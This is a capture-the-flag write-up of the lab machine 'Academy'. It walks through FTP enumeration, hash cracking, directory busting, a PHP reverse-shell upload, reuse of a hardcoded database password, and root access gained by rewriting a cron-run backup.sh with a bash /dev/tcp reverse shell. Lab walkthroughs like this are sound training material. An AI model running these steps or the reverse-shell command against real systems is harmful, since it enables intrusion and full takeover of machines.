# Academy machine writeup

Starting with nmap scan we have three ports open 21 22 80 for ftp ssh http
![nmap](https://github.com/moataz-bellah/writeups/assets/47069499/76c63fa9-0903-4491-b0b6-0b3967847799)

let's enumerate ftp. Let's see if it provides anonymous login
![ftp](https://github.com/moataz-bellah/writeups/assets/47069499/8d375b8c-4015-4b4e-8807-f9d375e91ea0)

Great it does provide anonymous login. We have an interesting file "note.txt". Check that file
![note](https://github.com/moataz-bellah/writeups/assets/47069499/9cd0569b-37eb-432e-b655-0ac8f41ad4d2)

It has inssert query, ok we have good findings like user_id and password hash. Crack the hash using online website like LINK.  
Yes we cracked the hash and it is "student", but how we can use that credential. Let's do some directory busting using ffuf. Why ffuf, because ffuf doesn't search inside any directory.
```
ffuf -u http://192.168.0.105/FUZZ  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ
[Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 2ms]
    * FUZZ: academy

[Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 2ms]
    * FUZZ: phpmyadmin

```
We found two paths /academy and /phpmyadmin. Let's try the credential we found in phpmyadmin, but it didn't work and it seems to be not vulnerable to sql injection, let's go to /academy. 
![dashboard](https://github.com/moataz-bellah/writeups/assets/47069499/6a8fda7f-287b-4de8-ae98-c516ae16f97b)

Great we are in, ok we are looking for a way to get a shell, there is file upload we can check it if it is vulnerable to RFI.
![upload](https://github.com/moataz-bellah/writeups/assets/47069499/df76ce66-4371-4833-aa28-ce93c7b111b9)

As we saw it is a php app we can use php reverse shell. Before we upload the shell we need to set netcat to listen to any incoming connections.
```
sudo nc -nvlp 1234
```
Upload the file
![netcat](https://github.com/moataz-bellah/writeups/assets/47069499/59faf962-7311-4dfb-a177-3da285d1e0a8)

Boom we have access, go to home
```
$ cd /home
$ ls
grimmie
```
we have grimmie user
```
cd grimmie
$ ls -la
total 36
drwxr-xr-x 3 grimmie administrator 4096 Jan 25 15:26 .
drwxr-xr-x 3 root    root          4096 May 30  2021 ..
-rw------- 1 grimmie administrator    1 Jun 16  2021 .bash_history
-rw-r--r-- 1 grimmie administrator  220 May 29  2021 .bash_logout
-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 .bashrc
drwxr-xr-x 3 grimmie administrator 4096 May 30  2021 .local
-rw-r--r-- 1 grimmie administrator  807 May 29  2021 .profile
-rwxr-xr-- 1 grimmie administrator   57 Jan 25 15:26 backup.sh
```
we have interesting file "backup.sh" but we can't execute it since we are www-data, we need to be grimmie, leave it now and continue exploring the server. Let's explore the website code files looking for any hardcoded credentials.
```
$ cd /var/www/html/academy
admin                   enroll-history.php  my-profile.php
assets                  enroll.php          pincode-verification.php
change-password.php     includes            print.php
check_availability.php  index.php           studentphoto
db                      logout.php
```
Inside admin/includes, there is a hardcoded credentials for mysql database
```
$ cd admin
$ cat config.php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
?>
```
Great we have username "grimmie" and password "My_V3ryS3cur3_P4ss", let's try to switch to grimmie
```
$ su grimmie
su grimmie
Password: My_V3ryS3cur3_P4ss

grimmie@academy:/var/www/html/academy/admin/includes$ whoami
grimmie
grimmie@academy:/var/www/html/academy/admin/includes$
```
# Privilege Escalation
Ok, get back to backup.sh, it seems that file executes each period of time, we need to make sure of that. Let's edit backup.sh and make it create a file
```
$ echo -e '#!/bin/bash \ntouch test' > backup.sh
```
We wait for a moment and see if something changes.
```
$ ls -la
total 36
drwxr-xr-x 3 grimmie administrator 4096 Jan 25 15:26 .
drwxr-xr-x 3 root    root          4096 May 30  2021 ..
-rw------- 1 grimmie administrator    1 Jun 16  2021 .bash_history
-rw-r--r-- 1 grimmie administrator  220 May 29  2021 .bash_logout
-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 .bashrc
drwxr-xr-x 3 grimmie administrator 4096 May 30  2021 .local
-rw-r--r-- 1 grimmie administrator  807 May 29  2021 .profile
-rwxr-xr-- 1 grimmie administrator   57 Jan 25 15:26 backup.sh
-rwxr-xr-- 1 grimmie administrator   57 Jan 25 15:26 test
```
Great it worked, we can use that and get shell and get root privilege
```
$ echo -e '#!/bin/bash \nbash -i >& /dev/tcp/192.168.0.104/4444 0>&1' > backup.sh
```
Let's set netcat to listen on port 4444 and wait for any connection
```
sudo nc -nvlp 4444
```
![root_shell](https://github.com/moataz-bellah/writeups/assets/47069499/fa475814-fe12-4614-aa8a-0afe54bcf2e4)
Yeah we are root now.
